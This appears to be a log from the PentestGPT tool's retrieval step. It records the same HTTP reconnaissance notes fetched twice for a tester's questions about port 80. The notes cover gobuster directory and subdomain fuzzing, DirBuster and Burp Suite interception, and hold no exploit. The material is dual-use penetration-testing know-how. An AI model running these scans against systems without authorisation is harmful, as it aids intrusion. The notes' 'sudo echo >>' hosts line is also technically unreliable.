+2024-05-06 19:27:35,932 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 0.85) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I think we should focus on port 80 | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-06 19:29:12,108 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 0.82) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+What serivce is running on port 80? | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
